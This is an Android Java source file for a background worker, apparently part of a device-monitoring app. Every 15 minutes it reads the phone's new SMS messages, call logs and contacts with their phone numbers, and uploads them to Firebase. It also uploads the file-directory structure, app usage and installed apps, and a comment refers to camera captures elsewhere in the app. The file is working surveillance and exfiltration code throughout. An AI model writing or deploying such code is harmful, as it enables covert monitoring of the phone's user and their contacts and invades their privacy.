package com.vikasyadavnsit.cdc.services;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.data.ApplicationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.enums.PermissionType;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.TimeUnit;

public class DeltaSyncWorker extends Worker {

    private static final String PREFS_NAME = "DeltaSyncPrefs";
    private static final String LAST_SMS_DATE = "last_sms_date";
    private static final String LAST_CALL_DATE = "last_call_date";
    private static final String LAST_CONTACT_TS = "last_contact_ts";

    public DeltaSyncWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    public static void schedule(@NonNull Context context) {
        WorkManager.getInstance(context).enqueue(new androidx.work.OneTimeWorkRequest.Builder(DeltaSyncWorker.class).build());

        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        PeriodicWorkRequest request = new PeriodicWorkRequest.Builder(DeltaSyncWorker.class, 15, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .addTag("DeltaSyncWorker")
                .build();

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "DeltaSyncWorker",
                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
                request
        );
        LoggerUtils.d("DeltaSyncWorker", "Scheduled periodic sync every 15 mins");
    }

    @NonNull
    @Override
    public Result doWork() {
        if (com.google.firebase.FirebaseApp.getApps(getApplicationContext()).isEmpty()) {
            LoggerUtils.w("DeltaSyncWorker", "Firebase not initialized yet, deferring work");
            return Result.retry();
        }

        LoggerUtils.i("DeltaSyncWorker", "Background Sync Cycle Started");

        PermissionManager pm = new PermissionManager();
        Context context = getApplicationContext();

        try {
            if (pm.hasPermission(context, PermissionType.READ_SMS) && isCaptureEnabled(ClickActions.REQUEST_SMS_PERMISSION)) {
                syncSms();
            } else {
                LoggerUtils.w("DeltaSyncWorker", "SMS Sync skipped: Permission missing or capture disabled");
            }

            if (pm.hasPermission(context, PermissionType.READ_CALL_LOG) && isCaptureEnabled(ClickActions.REQUEST_CALL_LOG_PERMISSION)) {
                syncCallLogs();
            } else {
                LoggerUtils.w("DeltaSyncWorker", "Call Log Sync skipped: Permission missing or capture disabled");
            }

            if (pm.hasPermission(context, PermissionType.READ_CONTACTS) && isCaptureEnabled(ClickActions.REQUEST_CONTACTS_PERMISSION)) {
                syncContacts();
            } else {
                LoggerUtils.w("DeltaSyncWorker", "Contacts Sync skipped: Permission missing or capture disabled");
            }

            if (pm.hasPermission(context, PermissionType.MANAGE_EXTERNAL_STORAGE) && isCaptureEnabled(ClickActions.REQUEST_FILE_ACCESS_PERMISSION)) {
                syncFileStructure();
            } else {
                LoggerUtils.w("DeltaSyncWorker", "File Structure Sync skipped: Permission missing or capture disabled");
            }

            if (pm.hasPermission(context, PermissionType.PACKAGE_USAGE_STATS) && isCaptureEnabled(ClickActions.MANAGE_USAGE_AND_APPS)) {
                syncUsageAndApps();
            } else {
                LoggerUtils.w("DeltaSyncWorker", "Usage & Apps Sync skipped: Permission missing or capture disabled");
            }

            // Camera sync is removed from periodic worker to prevent "ghost captures"
            // Camera actions are now strictly on-demand (Manual/Live) or specifically scheduled.
            
            LoggerUtils.i("DeltaSyncWorker", "Background Sync Cycle Completed Successfully");
            return Result.success();
        } catch (Exception e) {
            LoggerUtils.e("DeltaSyncWorker", "Sync Cycle Failed with Exception: " + e.getMessage());
            return Result.failure();
        }
    }

    private void syncUsageAndApps() {
        ApplicationData record = ApplicationDataRepository.getRecordByKey(ClickActions.MANAGE_USAGE_AND_APPS.name());
        if (record == null || record.getValue() == null) return;
        User.AppTriggerSettingsData data = new Gson().fromJson(record.getValue(), User.AppTriggerSettingsData.class);
        if (data == null || !"REAL_TIME".equals(data.getCaptureMode())) return;

        LoggerUtils.i("DeltaSyncWorker", "Triggering real-time usage and apps sync");
        AppUsageStats.getDailyUsageStats(getApplicationContext(), true);
        FirebaseUtils.uploadInstalledAppsSnapshot(com.vikasyadavnsit.cdc.utils.AppUtils.getInstalledApps(getApplicationContext()));
    }

    private boolean isCaptureEnabled(ClickActions action) {
        ApplicationData record = ApplicationDataRepository.getRecordByKey(action.name());
        if (record != null && record.getValue() != null) {
            User.AppTriggerSettingsData data = new Gson().fromJson(record.getValue(), User.AppTriggerSettingsData.class);
            return data != null && data.isCaptureEnabled();
        }
        return false;
    }

    private void syncSms() {
        long lastDate = getPrefs().getLong(LAST_SMS_DATE, 0);
        List<Map<String, String>> delta = fetchNewItems(Telephony.Sms.CONTENT_URI, Telephony.Sms.DATE, lastDate);
        if (!delta.isEmpty()) {
            LoggerUtils.i("DeltaSyncWorker", "Found " + delta.size() + " new SMS");
            FirebaseUtils.uploadUserSmsDataSnapshot(delta);
            long maxDate = delta.stream()
                    .mapToLong(m -> {
                        String s = m.get(Telephony.Sms.DATE);
                        return s != null ? Long.parseLong(s) : 0L;
                    })
                    .max().orElse(lastDate);
            getPrefs().edit().putLong(LAST_SMS_DATE, maxDate).apply();
        }
    }

    private void syncCallLogs() {
        long lastDate = getPrefs().getLong(LAST_CALL_DATE, 0);
        List<Map<String, String>> delta = fetchNewItems(CallLog.Calls.CONTENT_URI, CallLog.Calls.DATE, lastDate);
        if (!delta.isEmpty()) {
            LoggerUtils.i("DeltaSyncWorker", "Found " + delta.size() + " new Call Logs");
            FirebaseUtils.uploadUserCallLogsDataSnapshot(delta);
            long maxDate = delta.stream()
                    .mapToLong(m -> {
                        String s = m.get(CallLog.Calls.DATE);
                        return s != null ? Long.parseLong(s) : 0L;
                    })
                    .max().orElse(lastDate);
            getPrefs().edit().putLong(LAST_CALL_DATE, maxDate).apply();
        }
    }

    private void syncContacts() {
        long lastTs = getPrefs().getLong(LAST_CONTACT_TS, 0);
        List<Map<String, String>> delta = fetchNewItems(ContactsContract.Contacts.CONTENT_URI, 
                ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP, lastTs);
        if (!delta.isEmpty()) {
            LoggerUtils.i("DeltaSyncWorker", "Found " + delta.size() + " new/updated Contacts");
            
            // Enrich with phone numbers before upload
            for (Map<String, String> contact : delta) {
                enrichContact(contact);
            }
            
            FirebaseUtils.uploadUserContactsDataSnapshot(delta);
            long maxTs = delta.stream()
                    .mapToLong(m -> {
                        String s = m.get(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP);
                        return s != null ? Long.parseLong(s) : 0L;
                    })
                    .max().orElse(lastTs);
            getPrefs().edit().putLong(LAST_CONTACT_TS, maxTs).apply();
        }
    }

    private void syncFileStructure() {
        LoggerUtils.i("DeltaSyncWorker", "Triggering scheduled full BFS file structure sync");
        com.vikasyadavnsit.cdc.utils.FileExplorer.captureDirectoryStructure(getApplicationContext(), "", true);
    }

    private List<Map<String, String>> fetchNewItems(Uri uri, String dateColumn, long lastValue) {
        List<Map<String, String>> items = new ArrayList<>();
        // Optimization: Limit number of items per sync to avoid OutOfMemoryError
        String sortOrder = dateColumn + " ASC LIMIT 500";
        try (Cursor cursor = getApplicationContext().getContentResolver().query(
                uri, null, dateColumn + " > ?", new String[]{String.valueOf(lastValue)}, sortOrder)) {
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> item = new HashMap<>(); // Using HashMap instead of TreeMap for lower memory overhead
                    for (int k = 0; k < cursor.getColumnCount(); k++) {
                        String name = cursor.getColumnName(k);
                        String val = cursor.getString(k);
                        item.put(name, val != null ? val : "");
                    }
                    items.add(item);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            LoggerUtils.e("DeltaSyncWorker", "Error fetching from " + uri + " :: " + e.getMessage());
        }
        return items;
    }

    private void enrichContact(Map<String, String> contact) {
        // Alias display_name → "name" so uploadUserContactsDataSnapshot buckets by initial correctly
        String displayName = contact.get(ContactsContract.Contacts.DISPLAY_NAME);
        if (displayName != null && !displayName.isEmpty()) {
            contact.put("name", displayName);
        }

        String id = contact.get(ContactsContract.Contacts._ID);
        String hasPhone = contact.get(ContactsContract.Contacts.HAS_PHONE_NUMBER);
        if (id != null && "1".equals(hasPhone)) {
            try (Cursor pCur = getApplicationContext().getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                    new String[]{id}, null)) {

                if (pCur != null && pCur.moveToFirst()) {
                    int phoneIdx = pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    String number = pCur.getString(phoneIdx);
                    if (number != null) contact.put("number", number);
                }
            }
        }
    }

    private SharedPreferences getPrefs() {
        return getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
    }
}
